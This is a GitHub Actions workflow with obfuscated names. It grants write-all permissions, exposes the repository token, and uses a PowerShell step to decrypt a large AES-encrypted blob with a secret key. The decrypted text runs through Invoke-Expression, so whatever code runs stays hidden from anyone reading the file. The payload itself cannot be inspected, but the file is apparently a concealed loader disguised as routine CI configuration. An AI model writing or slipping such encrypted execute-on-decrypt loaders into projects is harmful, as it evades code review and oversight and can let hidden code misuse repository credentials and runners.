name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "U2FsdGVkX19487j1uRhzpOpljLdP9HKBpUDhOTDbcq1SPoYCoh07bJywVHGICWuanshC/9B5IMcK/tAygI1JHaakE1ot9Z/xcaNskukj3nMl5fOl2OKZZazb8/DG9bbp9Mc0fZw2ov+mQrFOGTbOadLO+cTVkIlBWQj8YamgsWWsAZBlE/6wJ8ZVRZKMMqbq7rjF0pukQQoxlOiro7LP04TnZFr6fqkEGs840Z2a6WChVZp50I1AxzHmGh9UrsclPsvnWmvaeec5Ru5QxlaQe3pg4VUkoU0y3ZAP7YggYwUT0vvFdqaG489c3zJeCgyULQENj7UC/zb0xjaUjP+wXHwSwAUp3jMZ79Gdcr82oLOVKfVgooI1sBvaroEuc42zKOtbWd3rTHVl1kCDZREbRmv5au0IzjXw6bK3IntNM7OoKWdnuft8ghN78Qx8hN89cWiKLmMbhDHtr4BOiclce1K8OadUqiLKVO+eNEH0lBHczmSctNrk7Cpyi74UIJTJZ4YpyAZOvdk1o809WN5FsEsS5rjNqBQFzL8R007p23k3pQSz5kr887QzYXgDohvf/Q09QIvVZMS0HlkhUwX/HyZwVdJYYyF51FXZJCwNNW2wBJ1JC7Y2d4Zmjxfz0f8bt4jdWSKOwivjS1K8GdPhSCMIngvRbKZmfV97zzakmzIZ70uxQtpa8Uajjd5EbMy6VG6uMjFyNyycSjkqvT4Yzr2YzLAikbiqd+6uL4Ap4VRpPEkeXae3IpB+8S98gry1TLJ3GK+AS2ql6GxTiE6Lu4m7scjaZfc5LQ67XaRnJH7s+M36Tu4OxfeuIzgZU84HPzik6AiRXIoX9AQ5HqooVZ/CPNpFiQT/tGCbU539R41CCJ29C+cA9+SUV5oER78ePIqMey41T1h+v7hTFbnac2Z3xyC+ucVgIX3rQT332IHOpks/ukTbX/7bS1u7ZltyhitywD+URnTL2OMubS670rjuLEVq5zAwu7P091dKn3TZhQM6VVpTtdNGz6VNzERg6B/h/j4/n/VhPiHh89OAL1j6XgtoXe/aG+27rMRyRxworH30oyyMOkHGZKcQtzCRkYX7b0npWDWJi4lUvDn0/jfvW6lCYP2RfWYEqTpW+Qg4FayoHwpCFsWZKttJyR4Ng/VVZvgi7CgwKszjAJrtOMDf++LjDmyGuuSxP8vF3TOvA5D20cxxMYXPNmB2jDkY38DrnpdDHdGJkOZbCU1oGBvQ2EnYdQr1xhePLKvnzxvNOCiyS6d2TeRYP15QgzLjxJzqhVwa3OadWblbrtAyR1X+4AbOy2UB7nb0hSAXZkhf5nnv4X2ruu1kOENHi//Hyvwr7HbBKA5Ej1TQCMetnP6vB0LxLUXwqWjNkZkUlakpTJAQIYps08DRnNG+mjr0YkZdtYdhHJvWCij+xroICl2xmJ78UEaNDRe0MvwT729QpwXA3x8MUO8Qp70MXZA2NCrBOjUv2W6G/D+lkqvbudWgThCyTPYxPLavTgfZhonQrA+y8/iEsrz4p2bG9taZrHjnBYPhMdUG3XLsSmUMPjppa6jinboci8cMHoeDn9ceG9YmNawKk1wSA1B2SnS9XdLOkCXm1aknMg5CHHAwBWLE9QVrkU/WxyuHdsnkVjA6a/Q3wWh4GM71IWoAJtzRoa9Ykf6XuxdnV994YzYuQt5C1sAaMbISeKY7mDHUTQV7CyPmQ7302MJ5xN32fh/MBGdvbaO72nAZwTbau8H4XarzukaidFaHf0jPjHNgwDAYZPZmJtnCyVFUgvVJpwgFTPij378bdQmxRRkuVaDMRnvKsVs+4i1fF0Ma/6l0Xya1g93DOmXT0FZkbO/0S048IBDK0Av/DoZmHYSLyCebWL/9H3l/IukOORnbfFtVU8Gt0+YoJqe6VD6eNQkYWmchdH65KgNJBpIC1nLupBM/I7VSj5ljBGmAWcExGFMD/ySNWn3VSLYw4F6avtU4B+WOojzdzttcerSVWUE0OMfbT7LEOdELBCtsx3ld4Wnb0FIVNOFMUBv15raebo1DOfmtbMFRp7/KcS9KNzmjYp3kZ5VTNaLmEKCMcBGd6BTXJb3dvhOqqFupbzlbcQMouWymWvAyIYcuCHNieTalMoFOjN6hWjH1OEuCwhIJpvHgg1y5yMWxbk5QfI25D8H8Tv7Gqub4WAII3YoSd/mnT/rQB3/NSadRSDMPe6CEJZ163De8KXQKlAmo/v/sezG84QF53KLVR/6scUdmm2bt+Xk12Qy4Y/SpoFhF9BF5qhtfEGHOQjx6MpiR5f/mfZ5Vuj/EXYO9iPhbSCLHV0hPjE2hFSMBU9o5FHi9F6VVTWXbFyqQqeyWUGP7N2hWaofjhzFtt8fXGpxdVmnYjhtbv91eXD8CEWgU1a6J9e6LJJ0LbcUiJTAX8bi+Ui/dsbPrvGxW777muvbxYsgCfV698qpdM03ATQIdJcIanT6FnzVKQISSIpr4pm13FWy9Hk7QBCWlZEcqX0CFacRXwRnvxB/GUMcScqjDFzVn9JywjgrKPZx7Y7jAiJTnrv82SyoJsQtTVciqKBy2Nz6cDuhWD6aOVNF8dgUoxIOMBcC1dZ6edxvDEBeNcVO5G22Z5j1/MWr/IazkaTtVPbVWNCRDe85tEOErUHHIgOKXbcqBifSEIzFgGmtWAWf5MaFX7rGJl4/cSC0cP/aphyEkFfIOwdwqBfURyLH2JLZ94N9ztxOpU7om+jEIV8YAioZlOKoawsbWdW7pWFQcogmu+tZ9zz6LDR8uLL3QD1QdWVYe+MYzS7MzjAIyJ5hit72Zx2XVV7KqKwhZR5mrkHVylBTyOdjkYEd/vkXkak9FnWOJLL0Lu2JxN3x6cHqiQe6z1lbfQZ980beQQy60iC7c2RAIKso5YnuEszYY1i1YlI/xjudTYbBrOuPB+AAHH/kHVg2x3p1mp8j741V4BQyrH1i2UwNSSuLWPqfoca78vVAA+6g988JC5jJqt3Ro+J6a22PCteju4xEoFwIW9B2as7rP7uVMXFtyPwxrZw/3UNVpiZIhgolmtaIfLEAmYem19lbA75tVQ9Uga7XBAEBh7hZnvTGoE1q41hLibqjDt5q7t1zj6Jf7H8+SeBeR1+LcahCWtAuBbRUWIvEXTI45m5fslB82UeHWlPbpXeuNAij+KZeZWrrlhXsi15fhlrYbrqCIyPbPaUvTRjhPi6YfHMEMzfxH95Dlt5m05CalZyN9V/Kc2cBoiHOSQRC1zfR23hEEKDkTT2rnMq1znsk7VLb7tAOS1TFrpHAs5LFFmXzoWx2YKwRIXkA6WLDHPaRGk8NZ1ClGPD6B60egpjL5UnKScXhwpFjrQYsi9MUDk09oS3QYCjFhcYf6uyykkf+dT8PzpJrxIQWT+PonFUFnRrbdX15Twy3t2VAyo3/Ly5X8ttrXiS0teNjEel/gaKpM+SAPIwHJ5JIZWocIAyoIFFBXkjHfqImJ7B8mzSU6HWFAxOeBDiSpb0pkxkqx5vMfbmZYgsg3OsLtciwkXq9th173WXHm9FzTNEbr1UOycrpeYp0OR9Xq92mOWbmAdj/19qo4iiSfIT/zHjfh8TZfI5YVUnTi7eknmRkB8eKPzOXe4zRqmk0nnLkMPCRAOXb8QaUv7cjd33SIBjsunphjXm9QNuVwzmFOhsgS7HYfppMH2EWERr06d3dMosgR1EBGKnvLF0OwrBGrDZZjlboqfbV1WQAVHFu9x3T1HsePvx0e4/DK5Wu/V7KWSLWq+p07lBNr3kuX47fTOsYMBKhAtvVAatzvKe2kf3t3H7nfBwq2fAdbwd72Mr3QPpAkdooth+31nn3nCedaLSLXRQ9+/zDgxlecNpbWoQVP78xH2d9OwAXnPXs1eJ0GxFdj3Pa/Poa0NWsbghWReOg+ZW22KxrXF9jpeOrz9VnhTMdlrEHsOJiXuU69a/9YwjIDDesAGeNF1+sTfRB/qvBZs+UL5w1d2z42x6pbCkVxaWaVvxa00ox2EZK76givO5uYga5vTLKXIahGowD2MtZbcPJSD+G0ZD4FZvV7CfJhICH8OVw3VtIS8rzWAP0KbCDlicg9Vvs48c0xkXmlhS5bCqfAet4ynY6uh9I5mEDAGhk+Ymps2V1XcwvnsvtNcL3uZsJ1xviSIvIRkFQlmjElUIm4jWqma+8mqwlMeB3dYtqhHGYY0JxbJU+Dc5mFvNVmReTwl5JIEQ7HcxpI9kh0jeR0RzYpNVhQStU/SJEgxXuX5vCRdyvTVEHpJPeI0Yy1jRTxL3+swhHnfKEDfT61ZKVyC9XHioEnrhKfU2H2pBUge55Jo8ipCCEnQ49YumBbT7Oz9YWY1yKru8yu8ESqFsN2IkV2ioIoHHBsrbUMrFf48PbSz1m/rmcWLCNF36OmZ4w9d6FYt7pT4qdsWsquJf0UH190W3IRnhe7tdCozlTkXxA8i99HrhcD+fLPT07KlIC2DRevDf930+DXnyxNIRDW+/V3Rf/fBqegOSgiq9X/aTP2q1BRi2e2dKi/iRGdKWxCcrMCdg0jfs+zFMZZucV1kyEnGk/ppyBMWf5R8TSNTZyGPR0AzTk4rrucEGsR/dawvkAhU1WK8Qzy1kaCsAj9DNNBPlEIK7Dn1TnLm5vDOTAPkV1lS4+Qywk0VMeMHQEArVGXk00JJN3SbSlKKz/gMzpGWw8VICVI9hP4/sZaQO8QFAMbcNEHcBuIDYZi7cft4m+gGfs9q6JRlTlfNIMJSTw0fEjwlZxK0tWYwqCkmryjcazMUne9Xv+wn3VfrvBUO9baRpNwlSuR0mHA8qZp9sv82ExuWk2g4egdjcYB4zcvv9XyeXZl6IOE+I/iAk+BA5f7bCijCSWyIdZ8MyL11c1vz4iBw6b0Xckhj4j+vlbD8tkqXhOEL3fgZzw+caA/FvFEYfuGvCANwY0baUjFop463n1eM55O2PBhyw7gZzkIi1zV5VqPUwnZUlhy8+RmmoorVSY2QripVwLy6vuW0uOtC08uz+KFNSH7/mWxrZfI/zYqwtALQYyUGxHMMbSRm6Xs5TTc/lDuxFgJvJSR0Ev2HtPdjAsfuFQoSlu0rC9at0w1DDmOdcqdBYtWwsWjfFgTgxK/V3TbWNKa20OvYpVIN8SFUkQ2ntdRoWmERR2SCAaW1tfoqjfmx3H7U/zDNR/pqJJcGEUweZGcoEnebdSKDwKzfy01OFKGXG3hj0Bz7XlD6Gzn0ZhpAgfSExYXRrX+GbIl/RLe8y9anJDSbtjCFL7De3Mko7l9Gp/Ca+J6oLogSSYeKKF9OzuLdBKnqiLAgLt2fWQcBJUGYRd2ditVlJ0hS69yV35q/l4ASeGL83myIuwm2GJTIMR8XW5iLb7aGHowRDwuHJFcCICMZzcnksdMbVW7pHxXx1Xqj8M8kE6pzxquIp2o926vzN85mV8L1ggI7aglC0kFE5GzSslQBi050A9Fq2nPopSd7EPGXOwOm/1PK9NkHs5TykSOWFmp7cwwfH5h+1uOSnc7N4+Bh32shML7Qyrucol2H/27dqqmVJV4/tTe8X6+Bw2R7P66m7aM6kxrCwa+iPxvwd6RRBa5eX2WeHZ3OYKzlOmbI94Ppf5yZhbvVXAznCdFl8X/8mWvJE/evtCT47pl1BpT6w2H6DL3CUeZhtQG7NZlOy/GwKA40bADvK8jsxVs0G18F0WeLE0XrOsfb/7+NamA2VKQFRrDkLQzyGTt9MbrKT5jyPG7WRHbG1PCRJkwIPhVdqxvSnCpO9Md53KC0IZZ52mtY36bCJl8WL11yOLYvARwk4MZyalitEemNW6Btf9ydnROaV4uvfmIwz3EWFRQnMR0d9MoUGTSnWQ1yn4OczIftryVMhDS4K9bTlEnqHJAgCUCA3hOO8yoz9Gqnv8Ongb0ZZej9Fd2Bcj1S+sODB+i21ks9j+6c39o5mWNvRpex6L2eTu4fOMK3mFn5A38M7wiYGeQNZgoMMQRcOhF0IEbH4oy1ZcfREBQ2oooQn5SR9zJXhfHgwIovryEY9zYzXHoEpyY2Da0imgzb4fJSlGDkllIaPqaLPvyQRk4nnINGtUA1sCNRONSeA8xX2rGkAvhIiLMYdZwgZRr17X0gLjB8fD0vlVqU5c7GjGE+XCFx0zpEVOuCjomi3roS5dQU2uGARedqEuHwzP8Nb1muBJRyydeCSkVIp1d4wROPGnhTCHd6/VYQiUzTTRh+o/t1RoLW+CB4WDr/P0ZYhDfCVQ8XddRHPtSTofn608x5QAfbhHmk94bR18YnIt5fqO7ZUIwrlaAPl5AgRZhOSYtsNCrnqGdZPQCkGOJmt9nKLnM+GQEIIEQUH4pLCjdURbkrqKaGMKXrJbDiijYFNCFLTgk/URqYGX+bW/Tk7MIWgKYmuh03IJGKTE0uEDH+gOnO4InBbb5Iinrsiuprb06Ybd34TSq/hzx4tsXEQ75qCMT/vCDnwKbKV8jVhWthOjWhQmpJOghEZRs/r01vblq2GPTuvhSxyOn2jmA9xn0TVj3hJiKXlRBbAzV0ksWIJoVnKca8Bz+jzocY/QSeAkqtx6XnHcC1yGc03UK6Sej7+nYhpP8RQtcB5SedaMB+NtEvJIi4s70haPBjvFU41WOTKlk8+ooBE81QEhN/9VafUHkfD8um567ZrmzT/OyJm4JILdGUCgZc4NKLMC+mpWssX2/riDThQEAHpYte3UqcTXV5VEqKgHKcDxcwjiyvm8vgz3rXTJ8fVGjlg7Y9vt5L/cT9FoKWugxyf8CURxeH8D33j3attCRrd9MJDNWdeFPoIJSBQeLShwbqv/N6Ad9bRuOAQH4GuBRTolfRyM3qPx/2rRDuLBLEcgKPxAisKbpTvnFkemlDNwyUhk6GDjW+czjT3MqjvCB+DzOMAxCFQsnjrRQiGd/+QNlLZhrb7TKqZHJ84jJkJwoGwtzqiQMlDxYgT/aAjAbk1BtSR1ucV5GUiT0BDaisod6KLDv7v6GKT8e77tgYuvekr6l9uGEsq5XSUkabUc0mZdS5s3i9WdYUgEUNYtggEs9fEXVkKuOE1ghBLXDvO02w6HEU1OXZhv3sZ9fb/BpPd2O92uaoEAmrsBULAWb/O24yZe7mDuBbhW7erJumZRPG7zY4IwLmWL082moOFcIasF+KW+Jo6TY4FrG3jwEqmuwTJC9G/O7u9WLLQwe4vNjRcbQGMGRTMjYFry9Bluvm3PN0VvA0eQMmysXu8p3zgtfWQkChl94nFU1g0hE7IW3QLIWcqJo3Kd1BbxmEcvvKgdxNIxMO/u9ZL+22thptD4s9TfSyJ1JhZi5xswlZfnRX6J2wXOI2FnawUoYcI/JJ88fSzRKeyK/2c48TtNFPIRGMDG/1HLnODlrajHpFDytsKrdoXq03IbMzgL65K6454j5b1MzrFflLH5xz8lOpR/4pRhDlvF4YOfo2rs9ch6VSl2tFQakMM0bNu+EhtmTi5Cwa5H/CVuFLoBxO/w7LAHaW3f0t3I41CwA7nM8sFC/HoFW4U105NF+7ezEGd+/Z37JMEq55sJtN753kGMo/RmH21xO7AtONr0KP/CkeH7rE54kAlehjPjBX3SFYUcfYcWSR4APsHgGVSIeP4jsoMfbcW2DU00i79JTsyyaIHdsaNdCF8cNZJSaECfK0ooRraDUbxJjqvL57uB6MSzZqPRlQy6enTEMCcLhZ9Ia21wiKpqgRwtU9jSEnMlcSTd6IXy/s+3Pglwso/MdOmKlXVhyfjqYdVwX5cXAh5kxd+NGBHwC8TVcR8xMaTjn+N3zrGEGcCjaMsH9xUyRZOvXjAo5A8tH+xE1QB2XqO5I7hnR7DVHy3Nxa8pf0brPxGt2jZsNzFYE3Ah9DhDzPeG9hLoyA2YYlBlET12W9wEmrwTJZlyfw+nhBzLOd0JnuBiLk98T4tb+ngvAZJbTKTmbdYnPHTaR4PbdxpqPZ/TGDLEJ9Xb9eJiwqSiFRzKpBUubnqmbMxHUvAZ4ZKg+fZya1twVN5iO1TPz9fxD9UxcfG4RIuRdn53O0m9+juSUiQI8g3GoNoQrxtv1enxT6fKtkX0MX6Qwv0DJeSv2TLrrqSnfnh7FInY5wr5HgM5bLYTmAJkpDeZG7KxUUnb3UJlajCX8WXIg/KyVNfG8CX/q9WlN3RWyEKym2NcVeEWR9DHVXG2TlukaliBSTKUx4YEw7aNbZWdRfBV0hFzqfd5IOXez7Dgqva1AomoDPcSM2w0vP9SZW6w3OdbDlhLnRbgpq4K6AuyYx7nRj0ij1Fpuh/Ags5ftQ6ScOydgGfJhDBEtJstpIg+q7QNrT6eo8hPDdjFbRNR3r+Hhj3fheiKdpVNYL8wwYoEe/SESc3KSpy9i8ig2eXq8AvS/7usRQdzgo1VRebigatyA2zLI/dHb3eVLJ8G7NPnhqSVQaL/BgHLn6offveBAEzY17oin2lfkJg4aFpg3uCuYpHixKHAZASd0VLDVCLe2J98vmfph2l3Fmy/SMJdc4UoB6qdPB30C6/JrInj7yYf1ktDLJRZYw/IuNTIdgGPkIaeBmNEo41gM/da5CjAtWgiHlZu83V04zzH0Fx4KG0JUWmCC+7arcNtZExgKRYnU/p+9vGjzPvWPV5/hxwrhMUdNnKUaI6BXjyz7wJYpan39r/4ZNmT/OiQm5JFSuXgpneOWjQ3FodrWdFb/TzEUkls8XdCwzF7sfFWIKmSloRN5kl8390gk3Ja3VOdsXsFybjAf+E3cq2nkGuPyeioWnHbkvJuw9fwXFSC5yxG77ZRDBnYN8tFpDCH8Un0sdyW5IaGS7T9yq9/ZzJtIxxSTpTdYeE0N/m+61K07ggXCM8ncS5oKukC2Utz41IObJV0y2cvel1VZKeEDidC01iPdHmlmwM2on9KKTCfSkyLbqBdrsyT1UXEgbu/opOzTZiRf1HEC/cITOxiBkOmZ5CDvZaLr2NejaDay4DxiOmtbue++5dfdWYmTfvmqhYP1VjypIp0vnVMkavlu/aMkTyZUIPmQfpMAqgkO0YkllahYT/qT2M00g3vlsIUIye0eelNVVbWd6rEzDLAY7K6ZolXHp0WD4mWKhTtrbL8PSA1p1TKqizlJKs4HgI+xv6qzRME+vOc5vNA/olT6gyteABCEm/w1yY1FgZm4qUCH6Na+9omgiN5QOkZ/QXvrH84iSkF3N8X+Il55wcl+evbah9p/Lbdiq7ZYcf4murgLd/N8diLvzRQ/6mPPgh27HRF5tuWIsRbEOJFzKHVIgO/Rm3mMIYi54oNp4olWCusi0E8iBJCFu5f7R26AAKo5gXkhYK463+8+p11YImkCEfYn1nhOfLvh889jznGVZnsoKJgnHTkkaCXTwWmgN1hwvtilm4WSmLj8+8D6ujCyhLnWaRRNJ0HcyF+eiUr9KrQtU48FZF6okqUiIeAhkGBERUOsJ7/nVLxj3qHb/KDTeB/dGQarsT948pERfbFGfE79ZWIDgKrionp1BLAL0YgXqVfiDghBhQTzWe+3TaNi31fYB62cuuwe5XW3WCbmhDR1OC0jUpenpbFW2DNnDWf1dPm8ksi4veR46Db+Y8YTGGc/xW+v6xPAsbHK"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
